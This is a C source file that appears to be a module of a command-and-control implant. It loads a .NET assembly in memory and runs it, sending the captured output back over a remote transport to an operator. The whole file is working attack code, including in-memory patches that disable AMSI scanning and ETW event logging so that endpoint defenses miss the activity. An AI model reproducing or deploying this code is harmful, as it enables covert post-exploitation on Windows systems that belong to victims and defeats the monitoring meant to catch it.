

#define BYPASS_AMSI  1         
#define BYPASS_ETW   1          

#include <windows.h>
#include <oleauto.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <io.h>


typedef struct transport_conn transport_conn_t;
typedef struct transport      transport_t;

typedef struct {
    uint8_t          *pe_bytes;
    uint64_t          pe_size;
    char              args[4096];
    transport_conn_t *conn;
    transport_t      *trans;
} ExecMemCtx;

#include "dotnet_exec.h"


extern int two_layer_send(transport_conn_t *conn, transport_t *trans,
                          const char *op, const void *buf, uint16_t len);

/* ======================================================================
 * COM GUIDs
 * ====================================================================== */
static const GUID CLSID_CLRMetaHost = {
    0x9280188d,0xe8e,0x4867,{0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde}};
static const GUID IID_ICLRMetaHost = {
    0xD332DB9E,0xB9B3,0x4125,{0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
static const GUID IID_ICLRRuntimeInfo = {
    0xBD39D1D2,0xBA2F,0x486a,{0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91}};
static const GUID CLSID_CorRuntimeHost = {
    0xcb2f6723,0xab3a,0x11d2,{0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};
static const GUID IID_ICorRuntimeHost = {
    0xcb2f6722,0xab3a,0x11d2,{0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};
static const GUID IID_AppDomain = {
    0x05F696DC,0x2B29,0x3663,{0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13}};

/* ======================================================================
 * Vtable helpers
 * ====================================================================== */
#define VTBL(p)          (*(void***)(p))
#define COM_RELEASE(p)   do { if(p) ((HRESULT(STDMETHODCALLTYPE*)(void*))(VTBL(p)[2]))(p); } while(0)


#define MetaHost_GetRuntime      3
#define RuntimeInfo_GetInterface 9
#define CorHost_Start            10
#define CorHost_GetDefaultDomain 13
#define AppDomain_Load_3         45


#define ONIDISP_GetIDsOfNames    5
#define ONIDISP_Invoke           6


typedef HRESULT (STDMETHODCALLTYPE *fn_Disp_GetIDsOfNames)(
    void*, REFIID, LPOLESTR*, UINT, LCID, DISPID*);
typedef HRESULT (STDMETHODCALLTYPE *fn_Disp_Invoke)(
    void*, DISPID, REFIID, LCID, WORD, DISPPARAMS*, VARIANT*, EXCEPINFO*, UINT*);


typedef HRESULT (WINAPI *fnCLRCreateInstance_t)(
    REFCLSID clsid, REFIID riid, LPVOID *ppInterface);


static const IID s_IID_NULL = {0,0,0,{0,0,0,0,0,0,0,0}};


typedef struct {
    HANDLE            hRead;
    transport_conn_t *conn;
    transport_t      *trans;
} DotnetPipeCtx;

static DWORD WINAPI dotnet_pipe_reader(LPVOID arg)
{
    DotnetPipeCtx *r = (DotnetPipeCtx*)arg;
    char  buf[4096];
    DWORD nRead;
    while (ReadFile(r->hRead, buf, sizeof buf, &nRead, NULL) && nRead > 0)
        two_layer_send(r->conn, r->trans, "0x02", buf, (uint16_t)nRead);
    return 0;
}


static SAFEARRAY *split_args_to_bstr(const char *args)
{
    if (!args || !*args) return NULL;

    int count = 0;
    const char *p = args;
    while (*p) {
        while (*p == ' ') p++;
        if (!*p) break;
        count++;
        if (*p == '"') {
            p++;
            while (*p && *p != '"') p++;
            if (*p) p++;
        } else {
            while (*p && *p != ' ') p++;
        }
    }
    if (count == 0) return NULL;

    SAFEARRAYBOUND bound = { (ULONG)count, 0 };
    SAFEARRAY *sa = SafeArrayCreate(VT_BSTR, 1, &bound);
    if (!sa) return NULL;

    p = args;
    long idx = 0;
    while (*p) {
        while (*p == ' ') p++;
        if (!*p) break;

        const char *start;
        int len;
        if (*p == '"') {
            p++;
            start = p;
            while (*p && *p != '"') p++;
            len = (int)(p - start);
            if (*p) p++;
        } else {
            start = p;
            while (*p && *p != ' ') p++;
            len = (int)(p - start);
        }

        int wlen = MultiByteToWideChar(CP_UTF8, 0, start, len, NULL, 0);
        WCHAR *wbuf = (WCHAR*)malloc((wlen + 1) * sizeof(WCHAR));
        if (wbuf) {
            MultiByteToWideChar(CP_UTF8, 0, start, len, wbuf, wlen);
            wbuf[wlen] = 0;
            BSTR bstr = SysAllocString(wbuf);
            SafeArrayPutElement(sa, &idx, bstr);
            SysFreeString(bstr);
            free(wbuf);
        }
        idx++;
    }
    return sa;
}

/* ======================================================================
 * AMSI bypass
 * ====================================================================== */
#if BYPASS_AMSI
static void patch_amsi(void)
{
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    void *pFunc = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pFunc) return;
    DWORD oldProt;
#ifdef _WIN64
    uint8_t patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
#else
    uint8_t patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
#endif
    if (VirtualProtect(pFunc, sizeof patch, PAGE_READWRITE, &oldProt)) {
        memcpy(pFunc, patch, sizeof patch);
        VirtualProtect(pFunc, sizeof patch, oldProt, &oldProt);
    }
}
#endif

/* ======================================================================
 * ETW bypass
 * ====================================================================== */
#if BYPASS_ETW
static void patch_etw(void)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    void *pFunc = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pFunc) return;
    DWORD oldProt;
#ifdef _WIN64
    uint8_t patch[] = { 0x33, 0xC0, 0xC3 };
#else
    uint8_t patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
    if (VirtualProtect(pFunc, sizeof patch, PAGE_READWRITE, &oldProt)) {
        memcpy(pFunc, patch, sizeof patch);
        VirtualProtect(pFunc, sizeof patch, oldProt, &oldProt);
    }
}
#endif

/* ======================================================================
 * exec_dotnet_in_process
 * ====================================================================== */
void exec_dotnet_in_process(ExecMemCtx *ctx)
{
    transport_conn_t *conn  = ctx->conn;
    transport_t      *trans = ctx->trans;
    uint8_t  *pe_bytes = ctx->pe_bytes;
    uint64_t  pe_size  = ctx->pe_size;
    const char *args   = ctx->args;

    HRESULT hr;
    void *pMetaHost      = NULL;
    void *pRuntimeInfo   = NULL;
    void *pCorHost       = NULL;
    IUnknown *pDomainThunk = NULL;
    void *pAppDomain     = NULL;
    void *pAssembly      = NULL;
    void *pMethodInfo    = NULL;
    SAFEARRAY *saPE      = NULL;
    SAFEARRAY *saArgs    = NULL;
    SAFEARRAY *saParams  = NULL;
    int methodInfoFromDispatch = 0; 

    HANDLE hReadPipe  = NULL, hWritePipe = NULL;
    HANDLE hOldStdout = NULL, hOldStderr = NULL;
    HANDLE hReaderThread = NULL;
    int oldCrtOut = -1, oldCrtErr = -1;
    int pipeFd = -1;

    printf("[DBG] exec_dotnet_in_process: start\n"); fflush(stdout);

    SECURITY_ATTRIBUTES saPipeAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    if (!CreatePipe(&hReadPipe, &hWritePipe, &saPipeAttr, 0)) {
        const char *err = "[EXEC-DOTNET] CreatePipe failed\n";
        two_layer_send(conn, trans, "0x02", err, (uint16_t)strlen(err));
        two_layer_send(conn, trans, "0x02", NULL, 0);
        return;
    }

    printf("[DBG] pipes created\n"); fflush(stdout);

    hOldStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    hOldStderr = GetStdHandle(STD_ERROR_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe);
    SetStdHandle(STD_ERROR_HANDLE,  hWritePipe);

    oldCrtOut = _dup(1);
    oldCrtErr = _dup(2);
    pipeFd = _open_osfhandle((intptr_t)hWritePipe, 0);
    if (pipeFd >= 0) {
        _dup2(pipeFd, 1);
        _dup2(pipeFd, 2);
    }

    DotnetPipeCtx pipeCtx = { hReadPipe, conn, trans };
    hReaderThread = CreateThread(NULL, 0, dotnet_pipe_reader, &pipeCtx, 0, NULL);

    #define DBG_PRINT(msg) do { \
        DWORD _w; WriteFile(hOldStderr, msg, (DWORD)strlen(msg), &_w, NULL); \
    } while(0)

    DBG_PRINT("[DBG] redirect done, loading CLR\n");

#if BYPASS_AMSI
    patch_amsi();
    DBG_PRINT("[DBG] AMSI patched\n");
#endif
#if BYPASS_ETW
    patch_etw();
    DBG_PRINT("[DBG] ETW patched\n");
#endif

    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
    if (!hMscoree) {
        DBG_PRINT("[DBG] mscoree.dll FAILED\n");
        goto cleanup;
    }
    DBG_PRINT("[DBG] mscoree.dll loaded\n");

    fnCLRCreateInstance_t pCLRCreateInstance =
        (fnCLRCreateInstance_t)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!pCLRCreateInstance) {
        DBG_PRINT("[DBG] CLRCreateInstance not found\n");
        goto cleanup;
    }

    DBG_PRINT("[DBG] CLRCreateInstance...\n");
    hr = pCLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, &pMetaHost);
    if (FAILED(hr)) { DBG_PRINT("[DBG] CLRCreateInstance FAILED\n"); goto cleanup; }

    DBG_PRINT("[DBG] GetRuntime...\n");
    typedef HRESULT (STDMETHODCALLTYPE *fn_GetRuntime)(void*, LPCWSTR, REFIID, void**);
    hr = ((fn_GetRuntime)VTBL(pMetaHost)[MetaHost_GetRuntime])(
        pMetaHost, L"v4.0.30319", &IID_ICLRRuntimeInfo, &pRuntimeInfo);
    if (FAILED(hr)) { DBG_PRINT("[DBG] GetRuntime FAILED\n"); goto cleanup; }

    DBG_PRINT("[DBG] GetInterface...\n");
    typedef HRESULT (STDMETHODCALLTYPE *fn_GetInterface)(void*, REFCLSID, REFIID, void**);
    hr = ((fn_GetInterface)VTBL(pRuntimeInfo)[RuntimeInfo_GetInterface])(
        pRuntimeInfo, &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, &pCorHost);
    if (FAILED(hr)) { DBG_PRINT("[DBG] GetInterface FAILED\n"); goto cleanup; }

    DBG_PRINT("[DBG] CorHost Start...\n");
    typedef HRESULT (STDMETHODCALLTYPE *fn_Start)(void*);
    hr = ((fn_Start)VTBL(pCorHost)[CorHost_Start])(pCorHost);
    if (FAILED(hr)) { DBG_PRINT("[DBG] CorHost Start FAILED\n"); goto cleanup; }

    DBG_PRINT("[DBG] GetDefaultDomain...\n");
    typedef HRESULT (STDMETHODCALLTYPE *fn_GetDefaultDomain)(void*, IUnknown**);
    hr = ((fn_GetDefaultDomain)VTBL(pCorHost)[CorHost_GetDefaultDomain])(
        pCorHost, &pDomainThunk);
    if (FAILED(hr)) { DBG_PRINT("[DBG] GetDefaultDomain FAILED\n"); goto cleanup; }

    DBG_PRINT("[DBG] QI AppDomain...\n");
    hr = pDomainThunk->lpVtbl->QueryInterface(pDomainThunk, &IID_AppDomain, &pAppDomain);
    if (FAILED(hr)) { DBG_PRINT("[DBG] QI AppDomain FAILED\n"); goto cleanup; }

    DBG_PRINT("[DBG] SafeArray PE...\n");
    SAFEARRAYBOUND bounds = { (ULONG)pe_size, 0 };
    saPE = SafeArrayCreate(VT_UI1, 1, &bounds);
    if (!saPE) { DBG_PRINT("[DBG] SafeArrayCreate PE FAILED\n"); goto cleanup; }
    void *pData = NULL;
    SafeArrayAccessData(saPE, &pData);
    memcpy(pData, pe_bytes, pe_size);
    SafeArrayUnaccessData(saPE);

    DBG_PRINT("[DBG] Load_3...\n");
    typedef HRESULT (STDMETHODCALLTYPE *fn_Load3)(void*, SAFEARRAY*, void**);
    hr = ((fn_Load3)VTBL(pAppDomain)[AppDomain_Load_3])(
        pAppDomain, saPE, &pAssembly);
    if (FAILED(hr)) {
        char buf[80];
        snprintf(buf, sizeof buf, "[DBG] Load_3 FAILED: 0x%08lX\n", hr);
        DBG_PRINT(buf);
        goto cleanup;
    }
    DBG_PRINT("[DBG] Load_3 OK, assembly loaded\n");

    {
        OLECHAR *propName = L"EntryPoint";
        DISPID dispid_ep;

        DBG_PRINT("[DBG] GetIDsOfNames(EntryPoint)...\n");
        hr = ((fn_Disp_GetIDsOfNames)VTBL(pAssembly)[ONIDISP_GetIDsOfNames])(
            pAssembly, &s_IID_NULL, &propName, 1,
            LOCALE_SYSTEM_DEFAULT, &dispid_ep);
        if (FAILED(hr)) {
            char buf[80];
            snprintf(buf, sizeof buf, "[DBG] GetIDsOfNames(EntryPoint) FAILED: 0x%08lX\n", hr);
            DBG_PRINT(buf);


            propName = L"get_EntryPoint";
            hr = ((fn_Disp_GetIDsOfNames)VTBL(pAssembly)[ONIDISP_GetIDsOfNames])(
                pAssembly, &s_IID_NULL, &propName, 1,
                LOCALE_SYSTEM_DEFAULT, &dispid_ep);
            if (FAILED(hr)) {
                DBG_PRINT("[DBG] GetIDsOfNames(get_EntryPoint) also FAILED\n");
                goto cleanup;
            }
        }

        char dbuf[80];
        snprintf(dbuf, sizeof dbuf, "[DBG] EntryPoint DISPID = %ld\n", (long)dispid_ep);
        DBG_PRINT(dbuf);

        DISPPARAMS dpNoArgs = {NULL, NULL, 0, 0};
        VARIANT vtEP;
        VariantInit(&vtEP);

        DBG_PRINT("[DBG] IDispatch::Invoke(EntryPoint, PROPERTYGET)...\n");
        hr = ((fn_Disp_Invoke)VTBL(pAssembly)[ONIDISP_Invoke])(
            pAssembly, dispid_ep, &s_IID_NULL,
            LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET,
            &dpNoArgs, &vtEP, NULL, NULL);
        if (FAILED(hr)) {
            snprintf(dbuf, sizeof dbuf, "[DBG] get_EntryPoint FAILED: 0x%08lX\n", hr);
            DBG_PRINT(dbuf);
            goto cleanup;
        }

        snprintf(dbuf, sizeof dbuf, "[DBG] EntryPoint VARIANT vt=%d\n", V_VT(&vtEP));
        DBG_PRINT(dbuf);

        if (V_VT(&vtEP) == VT_DISPATCH && V_DISPATCH(&vtEP)) {
            pMethodInfo = V_DISPATCH(&vtEP);
            methodInfoFromDispatch = 1;
        } else if (V_VT(&vtEP) == VT_UNKNOWN && V_UNKNOWN(&vtEP)) {
            pMethodInfo = (void*)V_UNKNOWN(&vtEP);
            methodInfoFromDispatch = 1;
        } else {
            DBG_PRINT("[DBG] EntryPoint returned unexpected type or NULL\n");
            VariantClear(&vtEP);
            goto cleanup;
        }
    }
    DBG_PRINT("[DBG] pMethodInfo obtained via IDispatch OK\n");
    {
        static const GUID IID_MethodInfo = {0xFFCC1B5D, 0xECB8, 0x38DD,{0x9B, 0x01, 0x3D, 0xC8, 0xAB, 0xC2, 0xAA, 0x5F}};

        #define MethodInfo_Invoke_3  37

        void *pMI = NULL;
        typedef HRESULT (STDMETHODCALLTYPE *fn_QI)(void*, REFIID, void**);
        DBG_PRINT("[DBG] QI for _MethodInfo...\n");
        hr = ((fn_QI)VTBL(pMethodInfo)[0])(pMethodInfo, &IID_MethodInfo, &pMI);
        if (FAILED(hr) || !pMI) {
            char buf[80];
            snprintf(buf, sizeof buf,
                     "[DBG] QI _MethodInfo FAILED: 0x%08lX, using raw ptr\n", hr);
            DBG_PRINT(buf);
            pMI = pMethodInfo; 
        } else {
            DBG_PRINT("[DBG] QI _MethodInfo OK\n");
        }

        saArgs = split_args_to_bstr(args);
        DBG_PRINT("[DBG] split_args done\n");

        SAFEARRAY *saBstrArgs = saArgs;
        if (!saBstrArgs) {
            SAFEARRAYBOUND emptyBound = { 0, 0 };
            saBstrArgs = SafeArrayCreate(VT_BSTR, 1, &emptyBound);
        }

        SAFEARRAYBOUND paramBound = { 1, 0 };
        saParams = SafeArrayCreate(VT_VARIANT, 1, &paramBound);
        if (!saParams) {
            DBG_PRINT("[DBG] SafeArrayCreate(params) FAILED\n");
            if (pMI != pMethodInfo) COM_RELEASE(pMI);
            goto cleanup;
        }

        VARIANT vtStringArgs;
        VariantInit(&vtStringArgs);
        V_VT(&vtStringArgs) = VT_ARRAY | VT_BSTR;
        V_ARRAY(&vtStringArgs) = saBstrArgs;

        long paramIdx = 0;
        SafeArrayPutElement(saParams, &paramIdx, &vtStringArgs);
        DBG_PRINT("[DBG] params SAFEARRAY built\n");

        VARIANT vtObj;
        VariantInit(&vtObj); 

        VARIANT vtResult;
        VariantInit(&vtResult);

        typedef HRESULT (STDMETHODCALLTYPE *fn_Invoke3)(
            void*, VARIANT, SAFEARRAY*, VARIANT*);

        DBG_PRINT("[DBG] calling Invoke_3 at vtable[37]...\n");
        hr = ((fn_Invoke3)VTBL(pMI)[MethodInfo_Invoke_3])(
            pMI, vtObj, saParams, &vtResult);

        if (SUCCEEDED(hr)) {
            DBG_PRINT("[DBG] Invoke_3 OK!\n");
        } else {
            char buf[128];
            snprintf(buf, sizeof buf,
                     "[EXEC-DOTNET] Invoke_3 failed: 0x%08lX\n", hr);
            DBG_PRINT(buf);
        }
        VariantClear(&vtResult);
        if (pMI != pMethodInfo) COM_RELEASE(pMI);
    }

    printf("\n");
    fflush(stdout);
    fflush(stderr);

cleanup:
    if (pipeFd >= 0) {
        _dup2(oldCrtOut, 1);
        _dup2(oldCrtErr, 2);
    }
    if (oldCrtOut >= 0) _close(oldCrtOut);
    if (oldCrtErr >= 0) _close(oldCrtErr);

    SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
    SetStdHandle(STD_ERROR_HANDLE,  hOldStderr);

    if (hWritePipe) CloseHandle(hWritePipe);

    if (hReaderThread) {
        WaitForSingleObject(hReaderThread, 5000);
        CloseHandle(hReaderThread);
    }
    if (hReadPipe) CloseHandle(hReadPipe);

    two_layer_send(conn, trans, "0x02", NULL, 0);

    if (saParams)   SafeArrayDestroy(saParams);
    if (saPE)       SafeArrayDestroy(saPE);
    COM_RELEASE(pMethodInfo);
    COM_RELEASE(pAssembly);
    COM_RELEASE(pAppDomain);
    if (pDomainThunk) pDomainThunk->lpVtbl->Release(pDomainThunk);
    COM_RELEASE(pCorHost);
    COM_RELEASE(pRuntimeInfo);
    COM_RELEASE(pMetaHost);
    if (hMscoree) FreeLibrary(hMscoree);
}